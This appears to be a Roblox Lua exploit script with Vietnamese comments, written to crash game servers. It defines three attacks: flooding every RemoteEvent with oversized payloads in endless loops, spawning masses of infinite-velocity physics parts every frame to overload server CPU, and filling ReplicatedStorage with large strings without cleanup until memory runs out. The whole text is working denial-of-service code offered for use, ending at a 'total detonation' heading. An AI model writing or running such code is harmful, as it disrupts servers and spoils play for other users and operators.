-- 2. LÕI HỦY DIỆT 1: REMOTE OVERLOAD (LÀM NGHẼN BĂNG THÔNG)
local function NetworkCrash()
    local payload = string.rep("💀DAN_CRASH💀", 5000) -- Tạo cục dữ liệu cực nặng
    for _, remote in pairs(game:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            task.spawn(function()
                while true do
                    -- Bắn liên tục dữ liệu nặng lên mọi RemoteEvent tìm thấy
                    remote:FireServer(payload, {payload}, math.huge)
                    task.wait(0.01) -- Độ trễ cực nhỏ để không làm treo Client ngay lập tức
                end
            end)
        end
    end
end

-- 3. LÕI HỦY DIỆT 2: PHYSICS ANARCHY (LÀM QUÁ TẢI CPU SERVER)
local function PhysicsCrash()
    RunService.Heartbeat:Connect(function()
        for i = 1, 50 do
            pcall(function()
                local p = Instance.new("Part")
                p.Size = Vector3.new(0.001, 0.001, 0.001) -- Nhỏ nhưng số lượng lớn
                p.CustomPhysicalProperties = PhysicalProperties.new(100, 100, 100, 100, 100)
                p.Velocity = Vector3.new(math.huge, math.huge, math.huge)
                p.Parent = workspace
                -- Ép Server tính toán va chạm liên tục
                task.delay(0.1, function() p:Destroy() end)
            end)
        end
    end)
end

-- 4. LÕI HỦY DIỆT 3: MEMORY LEAK (LÀM TRÀN BỘ NHỚ SERVER)
local function MemoryCrash()
    task.spawn(function()
        while true do
            local folder = Instance.new("Folder", game.ReplicatedStorage)
            for i = 1, 1000 do
                Instance.new("StringValue", folder).Value = string.rep("LAG", 10000)
            end
            task.wait(0.5)
            -- Không xóa folder cũ, để bộ nhớ server tăng dần đến khi sập
        end
    end)
end

-- KÍCH NỔ TỔNG LỰC
